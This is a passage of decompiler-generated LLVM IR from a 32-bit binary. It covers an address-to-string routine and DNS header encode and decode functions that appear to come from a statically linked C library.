  store i32 %v4_8059a11, i32* %eax.global-to-local, align 4
  %v0_8059a19 = load i32, i32* @ebx, align 4
  %v2_8059a19 = add i32 %v0_8059a19, %v4_8059a11
  store i32 %v2_8059a19, i32* @ebx, align 4
  br label %dec_label_pc_8059a1b

dec_label_pc_8059a1b:                             ; preds = %dec_label_pc_80599a0, %dec_label_pc_80599a4, %dec_label_pc_8059a06
  %stack_var_-116.0 = phi i32 [ %v6_8059a07, %dec_label_pc_8059a06 ], [ %stack_var_-116.160, %dec_label_pc_80599a0 ], [ %stack_var_-116.160, %dec_label_pc_80599a4 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805d0b7.348, i32 0, i32 0), %dec_label_pc_8059a06 ], [ %stack_var_-120.161, %dec_label_pc_80599a0 ], [ %stack_var_-120.161, %dec_label_pc_80599a4 ]
  %v0_80599a419 = phi i32 [ %v2_8059a19, %dec_label_pc_8059a06 ], [ %v0_80599ae62, %dec_label_pc_80599a0 ], [ %v1_80599a7, %dec_label_pc_80599a4 ]
  %v0_8059a1b = load i32, i32* @esi, align 4
  %v1_8059a1b = add i32 %v0_8059a1b, 1
  %v0_8059a25.pre = load i32, i32* @edi, align 4
  store i32 %v1_8059a1b, i32* @esi, align 4
  %v7_8059a1f = icmp sgt i32 %v1_8059a1b, 7
  %v10_8059a25 = icmp eq i32 %v0_8059a25.pre, -1
  br i1 %v7_8059a1f, label %dec_label_pc_8059a25, label %dec_label_pc_8059990

dec_label_pc_8059a25:                             ; preds = %dec_label_pc_8059a1b
  br i1 %v10_8059a25, label %dec_label_pc_8059a36, label %dec_label_pc_8059a2a

dec_label_pc_8059a2a:                             ; preds = %dec_label_pc_8059a25, %dec_label_pc_80599f6
  %v0_8059a32 = phi i32 [ %v0_80599a419, %dec_label_pc_8059a25 ], [ %v3_8059a02, %dec_label_pc_80599f6 ]
  %v0_8059a2a = phi i32 [ %v0_8059a25.pre, %dec_label_pc_8059a25 ], [ %v0_8059a2a.pre, %dec_label_pc_80599f6 ]
  %v1_8059a2a = load i32, i32* @ebp, align 4
  %v2_8059a2a = add i32 %v1_8059a2a, %v0_8059a2a
  store i32 %v2_8059a2a, i32* %eax.global-to-local, align 4
  %v9_8059a2d = icmp eq i32 %v2_8059a2a, 8
  %v1_8059a30 = icmp eq i1 %v9_8059a2d, false
  br i1 %v1_8059a30, label %dec_label_pc_8059a36, label %dec_label_pc_8059a32

dec_label_pc_8059a32:                             ; preds = %dec_label_pc_8059a2a
  %v1_8059a32 = inttoptr i32 %v0_8059a32 to i8*
  store i8 58, i8* %v1_8059a32, align 1
  %v0_8059a35 = load i32, i32* @ebx, align 4
  %v1_8059a35 = add i32 %v0_8059a35, 1
  store i32 %v1_8059a35, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059a36

dec_label_pc_8059a36:                             ; preds = %dec_label_pc_8059a2a, %dec_label_pc_8059a25, %dec_label_pc_8059a32
  %v0_8059a3a = phi i32 [ %v0_8059a32, %dec_label_pc_8059a2a ], [ %v0_80599a419, %dec_label_pc_8059a25 ], [ %v1_8059a35, %dec_label_pc_8059a32 ]
  store i32 %v2_8059985, i32* %edx.global-to-local, align 4
  %v1_8059a3a = add i32 %v0_8059a3a, 1
  store i32 %v1_8059a3a, i32* %eax.global-to-local, align 4
  %v1_8059a3d = inttoptr i32 %v0_8059a3a to i8*
  store i8 0, i8* %v1_8059a3d, align 1
  %v0_8059a40 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059a40 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059a40 = sub i32 %v0_8059a40, %v1_8059a40
  store i32 %v2_8059a40, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_8059a40, %arg4
  br i1 %tmp75, label %dec_label_pc_8059a48, label %dec_label_pc_8059a55

dec_label_pc_8059a48:                             ; preds = %dec_label_pc_8059a36
  %v0_8059a48 = load i8*, i8** %stack_var_-124, align 4
  %v1_8059a48 = ptrtoint i8* %v0_8059a48 to i32
  %v2_8059a48 = call i32 @__errno_location(i32 %v1_8059a48)
  store i32 %v2_8059a48, i32* %eax.global-to-local, align 4
  %v1_8059a4d = inttoptr i32 %v2_8059a48 to i32*
  store i32 28, i32* %v1_8059a4d, align 4
  br label %dec_label_pc_8059a76

dec_label_pc_8059a55:                             ; preds = %dec_label_pc_8059a36
  %v0_8059a55 = load i32, i32* @edi, align 4
  store i32 %v0_8059a55, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_8059a582 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_8059a582, i32* %tmp46, align 4
  %v0_8059a5f.cast = inttoptr i32 %v3_8059a582 to i8*
  %v5_8059a5f = call i32 @strcpy(i8* %v0_8059a5f.cast, i32 %v2_8059985)
  store i32 %v5_8059a5f, i32* %eax.global-to-local, align 4
  store i32 %v5_8059a5f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059a78

dec_label_pc_8059a6b:                             ; preds = %dec_label_pc_80598c1
  %v1_8059a6b = call i32 @__errno_location(i32 %v0_80598b4)
  store i32 %v1_8059a6b, i32* %eax.global-to-local, align 4
  %v1_8059a70 = inttoptr i32 %v1_8059a6b to i32*
  store i32 97, i32* %v1_8059a70, align 4
  br label %dec_label_pc_8059a76

dec_label_pc_8059a76:                             ; preds = %dec_label_pc_8059a48, %dec_label_pc_8059a6b
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059a78

dec_label_pc_8059a78:                             ; preds = %dec_label_pc_80599cf, %dec_label_pc_8059a55, %dec_label_pc_80598cc, %dec_label_pc_8059a76
  %v0_8059a7b = phi i32 [ 0, %dec_label_pc_80599cf ], [ %v5_8059a5f, %dec_label_pc_8059a55 ], [ %v3_80598d8, %dec_label_pc_80598cc ], [ 0, %dec_label_pc_8059a76 ]
  store i32 %v0_8059a7b, i32* %eax.global-to-local, align 4
  store i32 %v0_80598b4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8059a7b

; uselistorder directives
  uselistorder i32 %v0_8059a7b, { 1, 0 }
  uselistorder i32 %v0_8059a3a, { 1, 0 }
  uselistorder i1 %v10_8059a25, { 1, 0 }
  uselistorder i32 %v0_8059a25.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8059a1b, { 1, 0, 2 }
  uselistorder i32 %v1_8059a07, { 1, 0 }
  uselistorder i32 %v0_8059a10, { 3, 2, 0, 1 }
  uselistorder i32 %v2_805999c, { 1, 0 }
  uselistorder i32 %v2_8059995, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_80599ae62, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80599a063, { 2, 1, 0 }
  uselistorder i32 %v0_80599aa64, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8059985, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8059a2518, { 1, 0 }
  uselistorder i32 %v1_805997a, { 1, 0 }
  uselistorder i32 %v0_805997a, { 1, 0, 2 }
  uselistorder i32 %v5_8059982, { 1, 2, 0 }
  uselistorder i32 %v1_805995d, { 0, 2, 1 }
  uselistorder i32 %v0_805994d9, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805995813, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8059948, { 1, 0 }
  uselistorder i32 %v0_805997366, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805996867, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805995d69, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805991570, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80598b4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder [3 x i8]* @global_var_805d0b7.348, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 13, 7, 4, 6, 29, 9, 14, 1, 5, 0, 34, 35, 37, 36, 30, 31, 15, 16, 32, 17, 18, 19, 20, 38, 21, 33, 12, 22, 23, 24, 25, 26, 27, 28, 3, 10, 11, 2, 8 }
  uselistorder i32* @esp, { 0, 1, 101, 9, 102, 103, 104, 105, 106, 107, 10, 135, 2, 136, 137, 138, 139, 140, 141, 12, 142, 143, 144, 145, 146, 18, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 14, 157, 158, 159, 15, 160, 11, 161, 162, 163, 164, 165, 166, 16, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 13, 180, 181, 182, 183, 184, 185, 17, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 108, 109, 110, 20, 3, 111, 112, 113, 114, 115, 116, 117, 118, 119, 21, 19, 79, 80, 81, 82, 83, 22, 23, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 120, 209, 24, 210, 4, 5, 133, 6, 7, 25, 211, 212, 213, 214, 26, 215, 216, 217, 218, 29, 219, 220, 221, 30, 222, 31, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 28, 236, 32, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 27, 249, 250, 251, 252, 257, 260, 258, 253, 121, 122, 123, 124, 125, 255, 256, 259, 254, 261, 126, 127, 40, 128, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 34, 33, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 73, 35, 66, 67, 68, 69, 70, 71, 36, 72, 8, 74, 75, 76, 77, 78, 129, 130, 37, 131, 132, 262, 134, 207, 208 }
  uselistorder i32 60, { 9, 10, 16, 17, 13, 14, 0, 15, 2, 8, 18, 6, 3, 1, 11, 12, 22, 20, 21, 19, 23, 24, 25, 7, 4, 5 }
  uselistorder i32 31, { 19, 31, 33, 0, 1, 25, 26, 18, 27, 28, 16, 4, 5, 2, 3, 11, 24, 20, 21, 22, 8, 9, 6, 7, 17, 29, 30, 32, 12, 10, 13, 14, 23, 15 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 12, 2, 19, 13, 14, 16, 23, 21, 20, 4, 3, 22, 17, 0, 5, 6, 7, 8, 9, 10, 11, 18, 15 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8059a78, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8059a76, { 1, 0 }
  uselistorder label %dec_label_pc_8059a36, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059a1b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80599b2, { 1, 0 }
  uselistorder label %dec_label_pc_80599aa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059990, { 1, 0 }
  uselistorder label %dec_label_pc_8059985, { 1, 0 }
  uselistorder label %dec_label_pc_8059975, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059971, { 1, 0 }
  uselistorder label %dec_label_pc_805995d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805995a, { 1, 0 }
  uselistorder label %dec_label_pc_8059930, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8059a88 = load i32, i32* @ebx, align 4
  store i32 %v0_8059a88, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_8059a92 = ptrtoint i8* %tmp to i32
  store i32 %v4_8059a92, i32* %esi.global-to-local, align 4
  %v7_8059a96 = icmp sgt i32 %tmp9, 11
  br i1 %v7_8059a96, label %dec_label_pc_8059a9c, label %dec_label_pc_8059b30

dec_label_pc_8059a9c:                             ; preds = %entry
  %v1_8059a9c = add i32 %tmp8, 1
  %v2_8059a9c = inttoptr i32 %v1_8059a9c to i8*
  %v3_8059a9c = load i8, i8* %v2_8059a9c, align 1
  store i8 %v3_8059a9c, i8* %tmp, align 1
  %v0_8059aa2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059aa2 = inttoptr i32 %v0_8059aa2 to i32*
  %v2_8059aa2 = load i32, i32* %v1_8059aa2, align 4
  %v1_8059aa4 = trunc i32 %v2_8059aa2 to i8
  %v2_8059aa4 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059aa4 = add i32 %v2_8059aa4, 1
  %v4_8059aa4 = inttoptr i32 %v3_8059aa4 to i8*
  store i8 %v1_8059aa4, i8* %v4_8059aa4, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8059ac9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059ac9 = add i32 %v0_8059ac9, 8
  %v2_8059ac9 = inttoptr i32 %v1_8059ac9 to i32*
  %v3_8059ac9 = load i32, i32* %v2_8059ac9, align 4
  %v1_8059acc = mul i32 %v3_8059ac9, 8
  %v2_8059acf = and i32 %v1_8059acc, 120
  %v2_8059ad2 = or i32 %v2_8059acf, 4
  store i32 %v2_8059ad2, i32* %edx.global-to-local, align 4
  %v1_8059ad4 = add i32 %v0_8059ac9, 20
  %v2_8059ad4 = inttoptr i32 %v1_8059ad4 to i32*
  %v3_8059ad4 = load i32, i32* %v2_8059ad4, align 4
  %v4_8059ad4 = icmp eq i32 %v3_8059ad4, 0
  %v1_8059ad8 = icmp eq i1 %v4_8059ad4, false
  %v2_8059ad8 = zext i1 %v1_8059ad8 to i32
  %v2_8059adb = or i32 %v2_8059ad8, %v2_8059ad2
  store i32 %v2_8059adb, i32* %edx.global-to-local, align 4
  %v2_8059add = or i32 %v2_8059adb, 130
  %v3_8059add = trunc i32 %v2_8059add to i8
  store i32 %v2_8059add, i32* @ecx, align 4
  %v2_8059adf = load i32, i32* %esi.global-to-local, align 4
  %v3_8059adf = add i32 %v2_8059adf, 2
  %v4_8059adf = inttoptr i32 %v3_8059adf to i8*
  store i8 %v3_8059add, i8* %v4_8059adf, align 1
  %v0_8059ae2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059ae6 = add i32 %v0_8059ae2, 28
  %v2_8059ae6 = inttoptr i32 %v1_8059ae6 to i8*
  %v3_8059ae6 = load i8, i8* %v2_8059ae6, align 1
  %v5_8059ae6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059aef = urem i8 %v3_8059ae6, 16
  %v7_8059aef = zext i8 %v2_8059aef to i32
  %v9_8059aef = and i32 %v5_8059ae6, -256
  %v10_8059aef = or i32 %v9_8059aef, %v7_8059aef
  store i32 %v10_8059aef, i32* %edx.global-to-local, align 4
  %v2_8059af2 = or i8 %v2_8059aef, -128
  %v2_8059af4 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059af4 = add i32 %v2_8059af4, 3
  %v4_8059af4 = inttoptr i32 %v3_8059af4 to i8*
  store i8 %v2_8059af2, i8* %v4_8059af4, align 1
  %v0_8059af7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059af7 = add i32 %v0_8059af7, 33
  %v2_8059af7 = inttoptr i32 %v1_8059af7 to i8*
  %v3_8059af7 = load i8, i8* %v2_8059af7, align 1
  %v2_8059afb = load i32, i32* %esi.global-to-local, align 4
  %v3_8059afb = add i32 %v2_8059afb, 4
  %v4_8059afb = inttoptr i32 %v3_8059afb to i8*
  store i8 %v3_8059af7, i8* %v4_8059afb, align 1
  %v0_8059afe = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059afe = add i32 %v0_8059afe, 32
  %v2_8059afe = inttoptr i32 %v1_8059afe to i32*
  %v3_8059afe = load i32, i32* %v2_8059afe, align 4
  %v1_8059b01 = trunc i32 %v3_8059afe to i8
  %v2_8059b01 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b01 = add i32 %v2_8059b01, 5
  %v4_8059b01 = inttoptr i32 %v3_8059b01 to i8*
  store i8 %v1_8059b01, i8* %v4_8059b01, align 1
  %v0_8059b04 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059b04 = add i32 %v0_8059b04, 37
  %v2_8059b04 = inttoptr i32 %v1_8059b04 to i8*
  %v3_8059b04 = load i8, i8* %v2_8059b04, align 1
  %v2_8059b08 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b08 = add i32 %v2_8059b08, 6
  %v4_8059b08 = inttoptr i32 %v3_8059b08 to i8*
  store i8 %v3_8059b04, i8* %v4_8059b08, align 1
  %v0_8059b0b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059b0b = add i32 %v0_8059b0b, 36
  %v2_8059b0b = inttoptr i32 %v1_8059b0b to i32*
  %v3_8059b0b = load i32, i32* %v2_8059b0b, align 4
  %v1_8059b0e = trunc i32 %v3_8059b0b to i8
  %v2_8059b0e = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b0e = add i32 %v2_8059b0e, 7
  %v4_8059b0e = inttoptr i32 %v3_8059b0e to i8*
  store i8 %v1_8059b0e, i8* %v4_8059b0e, align 1
  %v0_8059b11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059b11 = add i32 %v0_8059b11, 41
  %v2_8059b11 = inttoptr i32 %v1_8059b11 to i8*
  %v3_8059b11 = load i8, i8* %v2_8059b11, align 1
  %v2_8059b15 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b15 = add i32 %v2_8059b15, 8
  %v4_8059b15 = inttoptr i32 %v3_8059b15 to i8*
  store i8 %v3_8059b11, i8* %v4_8059b15, align 1
  %v0_8059b18 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059b18 = add i32 %v0_8059b18, 40
  %v2_8059b18 = inttoptr i32 %v1_8059b18 to i32*
  %v3_8059b18 = load i32, i32* %v2_8059b18, align 4
  %v1_8059b1b = trunc i32 %v3_8059b18 to i8
  %v2_8059b1b = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b1b = add i32 %v2_8059b1b, 9
  %v4_8059b1b = inttoptr i32 %v3_8059b1b to i8*
  store i8 %v1_8059b1b, i8* %v4_8059b1b, align 1
  %v0_8059b1e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059b1e = add i32 %v0_8059b1e, 45
  %v2_8059b1e = inttoptr i32 %v1_8059b1e to i8*
  %v3_8059b1e = load i8, i8* %v2_8059b1e, align 1
  %v2_8059b22 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b22 = add i32 %v2_8059b22, 10
  %v4_8059b22 = inttoptr i32 %v3_8059b22 to i8*
  store i8 %v3_8059b1e, i8* %v4_8059b22, align 1
  %v0_8059b25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059b25 = add i32 %v0_8059b25, 44
  %v2_8059b25 = inttoptr i32 %v1_8059b25 to i32*
  %v3_8059b25 = load i32, i32* %v2_8059b25, align 4
  %v1_8059b28 = trunc i32 %v3_8059b25 to i8
  %v2_8059b28 = load i32, i32* %esi.global-to-local, align 4
  %v3_8059b28 = add i32 %v2_8059b28, 11
  %v4_8059b28 = inttoptr i32 %v3_8059b28 to i8*
  store i8 %v1_8059b28, i8* %v4_8059b28, align 1
  %v2_8059b30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8059b30

dec_label_pc_8059b30:                             ; preds = %entry, %dec_label_pc_8059a9c
  %v2_8059b30 = phi i32 [ %v0_8059a88, %entry ], [ %v2_8059b30.pre, %dec_label_pc_8059a9c ]
  %v0_8059b32 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8059a9c ]
  store i32 %v2_8059b30, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8059b32

; uselistorder directives
  uselistorder i32 45, { 7, 1, 2, 0, 5, 8, 3, 4, 6 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 0, 1, 3 }
  uselistorder i32 33, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8059b30, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059b34 = load i32, i32* @ebx, align 4
  store i32 %v0_8059b34, i32* %stack_var_-4, align 4
  %v4_8059b35 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8059b35, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8059b3d = load i8, i8* %tmp2, align 1
  %v3_8059b3d = zext i8 %v2_8059b3d to i32
  %v1_8059b40 = add i32 %v4_8059b35, 1
  %v2_8059b40 = inttoptr i32 %v1_8059b40 to i8*
  %v3_8059b40 = load i8, i8* %v2_8059b40, align 1
  %v4_8059b40 = zext i8 %v3_8059b40 to i32
  %v2_8059b44 = mul nuw nsw i32 %v3_8059b3d, 256
  %v2_8059b47 = or i32 %v4_8059b40, %v2_8059b44
  %v2_8059b49 = inttoptr i32 %tmp to i32*
  store i32 %v2_8059b47, i32* %v2_8059b49, align 4
  %v0_8059b4b = load i32, i32* @ecx, align 4
  %v1_8059b4b = add i32 %v0_8059b4b, 2
  %v2_8059b4b = inttoptr i32 %v1_8059b4b to i8*
  %v3_8059b4b = load i8, i8* %v2_8059b4b, align 1
  %tmp6 = icmp slt i8 %v3_8059b4b, 0
  %v2_8059b4f = zext i1 %tmp6 to i32
  %v1_8059b52 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b52 = add i32 %v1_8059b52, 4
  %v3_8059b52 = inttoptr i32 %v2_8059b52 to i32*
  store i32 %v2_8059b4f, i32* %v3_8059b52, align 4
  %v0_8059b55 = load i32, i32* @ecx, align 4
  %v1_8059b55 = add i32 %v0_8059b55, 2
  %v2_8059b55 = inttoptr i32 %v1_8059b55 to i8*
  %v3_8059b55 = load i8, i8* %v2_8059b55, align 1
  %v3_8059b58 = udiv i8 %v3_8059b55, 8
  %tmp7 = urem i8 %v3_8059b58, 16
  %v1_8059b5b = zext i8 %tmp7 to i32
  %v1_8059b5e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b5e = add i32 %v1_8059b5e, 8
  %v3_8059b5e = inttoptr i32 %v2_8059b5e to i32*
  store i32 %v1_8059b5b, i32* %v3_8059b5e, align 4
  %v0_8059b61 = load i32, i32* @ecx, align 4
  %v1_8059b61 = add i32 %v0_8059b61, 2
  %v2_8059b61 = inttoptr i32 %v1_8059b61 to i8*
  %v3_8059b61 = load i8, i8* %v2_8059b61, align 1
  %div = udiv i8 %v3_8059b61, 4
  %tmp8 = urem i8 %div, 2
  %v1_8059b68 = zext i8 %tmp8 to i32
  %v1_8059b6b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b6b = add i32 %v1_8059b6b, 12
  %v3_8059b6b = inttoptr i32 %v2_8059b6b to i32*
  store i32 %v1_8059b68, i32* %v3_8059b6b, align 4
  %v0_8059b6e = load i32, i32* @ecx, align 4
  %v1_8059b6e = add i32 %v0_8059b6e, 2
  %v2_8059b6e = inttoptr i32 %v1_8059b6e to i8*
  %v3_8059b6e = load i8, i8* %v2_8059b6e, align 1
  %div5 = udiv i8 %v3_8059b6e, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8059b74 = zext i8 %tmp9 to i32
  %v1_8059b77 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b77 = add i32 %v1_8059b77, 16
  %v3_8059b77 = inttoptr i32 %v2_8059b77 to i32*
  store i32 %v1_8059b74, i32* %v3_8059b77, align 4
  %v0_8059b7a = load i32, i32* @ecx, align 4
  %v1_8059b7a = add i32 %v0_8059b7a, 2
  %v2_8059b7a = inttoptr i32 %v1_8059b7a to i8*
  %v3_8059b7a = load i8, i8* %v2_8059b7a, align 1
  %tmp10 = urem i8 %v3_8059b7a, 2
  %v1_8059b7e = zext i8 %tmp10 to i32
  %v1_8059b81 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b81 = add i32 %v1_8059b81, 20
  %v3_8059b81 = inttoptr i32 %v2_8059b81 to i32*
  store i32 %v1_8059b7e, i32* %v3_8059b81, align 4
  %v0_8059b84 = load i32, i32* @ecx, align 4
  %v1_8059b84 = add i32 %v0_8059b84, 3
  %v2_8059b84 = inttoptr i32 %v1_8059b84 to i8*
  %v3_8059b84 = load i8, i8* %v2_8059b84, align 1
  %tmp11 = icmp slt i8 %v3_8059b84, 0
  %v2_8059b88 = zext i1 %tmp11 to i32
  %v1_8059b8b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b8b = add i32 %v1_8059b8b, 24
  %v3_8059b8b = inttoptr i32 %v2_8059b8b to i32*
  store i32 %v2_8059b88, i32* %v3_8059b8b, align 4
  %v0_8059b8e = load i32, i32* @ecx, align 4
  %v1_8059b8e = add i32 %v0_8059b8e, 3
  %v2_8059b8e = inttoptr i32 %v1_8059b8e to i8*
  %v3_8059b8e = load i8, i8* %v2_8059b8e, align 1
  %tmp12 = urem i8 %v3_8059b8e, 16
  %v1_8059b92 = zext i8 %tmp12 to i32
  %v1_8059b95 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059b95 = add i32 %v1_8059b95, 28
  %v3_8059b95 = inttoptr i32 %v2_8059b95 to i32*
  store i32 %v1_8059b92, i32* %v3_8059b95, align 4
  %v0_8059b98 = load i32, i32* @ecx, align 4
  %v1_8059b98 = add i32 %v0_8059b98, 4
  %v2_8059b98 = inttoptr i32 %v1_8059b98 to i8*
  %v3_8059b98 = load i8, i8* %v2_8059b98, align 1
  %v4_8059b98 = zext i8 %v3_8059b98 to i32
  %v1_8059b9c = add i32 %v0_8059b98, 5
  %v2_8059b9c = inttoptr i32 %v1_8059b9c to i8*
  %v3_8059b9c = load i8, i8* %v2_8059b9c, align 1
  %v4_8059b9c = zext i8 %v3_8059b9c to i32
  %v2_8059ba0 = mul nuw nsw i32 %v4_8059b98, 256
  %v2_8059ba3 = or i32 %v4_8059b9c, %v2_8059ba0
  %v1_8059ba5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059ba5 = add i32 %v1_8059ba5, 32
  %v3_8059ba5 = inttoptr i32 %v2_8059ba5 to i32*
  store i32 %v2_8059ba3, i32* %v3_8059ba5, align 4
  %v0_8059ba8 = load i32, i32* @ecx, align 4
  %v1_8059ba8 = add i32 %v0_8059ba8, 6
  %v2_8059ba8 = inttoptr i32 %v1_8059ba8 to i8*
  %v3_8059ba8 = load i8, i8* %v2_8059ba8, align 1
  %v4_8059ba8 = zext i8 %v3_8059ba8 to i32
  %v1_8059bac = add i32 %v0_8059ba8, 7
  %v2_8059bac = inttoptr i32 %v1_8059bac to i8*
  %v3_8059bac = load i8, i8* %v2_8059bac, align 1
  %v4_8059bac = zext i8 %v3_8059bac to i32
  %v2_8059bb0 = mul nuw nsw i32 %v4_8059ba8, 256
  %v2_8059bb3 = or i32 %v4_8059bac, %v2_8059bb0
  %v1_8059bb5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059bb5 = add i32 %v1_8059bb5, 36
  %v3_8059bb5 = inttoptr i32 %v2_8059bb5 to i32*
  store i32 %v2_8059bb3, i32* %v3_8059bb5, align 4
  %v0_8059bb8 = load i32, i32* @ecx, align 4
  %v1_8059bb8 = add i32 %v0_8059bb8, 8
  %v2_8059bb8 = inttoptr i32 %v1_8059bb8 to i8*
  %v3_8059bb8 = load i8, i8* %v2_8059bb8, align 1
  %v4_8059bb8 = zext i8 %v3_8059bb8 to i32
  %v1_8059bbc = add i32 %v0_8059bb8, 9
  %v2_8059bbc = inttoptr i32 %v1_8059bbc to i8*
  %v3_8059bbc = load i8, i8* %v2_8059bbc, align 1
  %v4_8059bbc = zext i8 %v3_8059bbc to i32
  %v2_8059bc0 = mul nuw nsw i32 %v4_8059bb8, 256
  %v2_8059bc3 = or i32 %v4_8059bbc, %v2_8059bc0
  %v1_8059bc5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059bc5 = add i32 %v1_8059bc5, 40
  %v3_8059bc5 = inttoptr i32 %v2_8059bc5 to i32*
  store i32 %v2_8059bc3, i32* %v3_8059bc5, align 4
  %v0_8059bc8 = load i32, i32* @ecx, align 4
  %v1_8059bc8 = add i32 %v0_8059bc8, 10
  %v2_8059bc8 = inttoptr i32 %v1_8059bc8 to i8*
  %v3_8059bc8 = load i8, i8* %v2_8059bc8, align 1
  %v4_8059bc8 = zext i8 %v3_8059bc8 to i32
  %v1_8059bcc = add i32 %v0_8059bc8, 11
  %v2_8059bcc = inttoptr i32 %v1_8059bcc to i8*
  %v3_8059bcc = load i8, i8* %v2_8059bcc, align 1
  %v4_8059bcc = zext i8 %v3_8059bcc to i32
  %v2_8059bd0 = mul nuw nsw i32 %v4_8059bc8, 256
  %v2_8059bd3 = or i32 %v4_8059bcc, %v2_8059bd0
